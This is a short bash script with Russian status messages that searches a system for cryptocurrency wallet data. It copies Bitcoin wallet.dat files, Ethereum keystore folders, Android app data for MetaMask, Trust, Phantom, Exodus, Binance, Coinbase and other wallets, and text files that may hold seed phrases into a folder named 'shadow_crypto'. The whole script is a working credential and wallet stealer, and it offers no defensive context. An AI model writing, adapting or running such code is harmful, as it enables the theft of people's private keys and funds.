#!/bin/bash
OUT="$HOME/shadow_crypto_$(date +%H%M)"
mkdir -p "$OUT"

echo "[CRYPTO v2] Глубокий поиск крипты..."

# Bitcoin Core
find / -name "wallet.dat" 2>/dev/null | while read f; do cp "$f" "$OUT/" 2>/dev/null; echo "  ₿ $f"; done

# Ethereum / BSC / Polygon
find / -name "keystore" -type d 2>/dev/null | while read d; do cp -r "$d" "$OUT/" 2>/dev/null; echo "  ⟠ $d"; done

# MetaMask / Trust Wallet / Phantom
for wallet in "metamask" "trust" "phantom" "exodus" "binance" "coinbase" "blockchain"; do
    find /data/data -maxdepth 2 -path "*$wallet*" -type d 2>/dev/null | while read d; do
        cp -r "$d" "$OUT/${wallet}_data" 2>/dev/null
        echo "  👛 $wallet: $d"
    done
done

# Seed-фразы (12/24 слова)
find / -name "*.txt" -o -name "*.md" 2>/dev/null | head -30 | while read f; do
    WORDS=$(grep -oE '\b[a-z]{3,8}\b' "$f" 2>/dev/null | wc -l)
    [ "$WORDS" -ge 12 ] && cp "$f" "$OUT/" 2>/dev/null && echo "  🌱 Seed phrase: $f"
done

echo "[CRYPTO v2] Собрано: $(ls "$OUT" | wc -l) артефактов"
